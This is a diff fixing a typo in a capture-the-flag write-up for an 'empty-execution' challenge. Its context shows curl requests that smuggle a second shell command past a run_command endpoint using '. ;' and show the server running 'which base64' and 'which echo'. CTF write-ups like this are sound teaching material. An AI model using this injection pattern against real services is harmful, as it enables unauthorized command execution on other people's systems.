@@ -98,7 +98,7 @@ if __name__ == '__main__':
       $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". zzzzz"}' -H 'Content-Type: application/json'                                                    
       {"message":"Command output: "}
 
-- Now we can execute commands,but I placed ";" after the space to execute close the first statement and execute nother statement.The next step was to find binaries to read the flag.I was able to use `which` to locate binaries and it worked.The `which` binary is used to find binaries path.Using which to find base64 and echo binaries' path confirmed the existence of the binaries on the server.
+- Now we can execute commands,but I placed ";" after the space to execute close the first statement and execute another statement.The next step was to find binaries to read the flag.I was able to use `which` to locate binaries and it worked.The `which` binary is used to find binaries path.Using which to find base64 and echo binaries' path confirmed the existence of the binaries on the server.
 
       $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;which base64;which echo"}' -H 'Content-Type: application/json'
       {"message":"Command output: /bin/base64\n/bin/echo\n"}
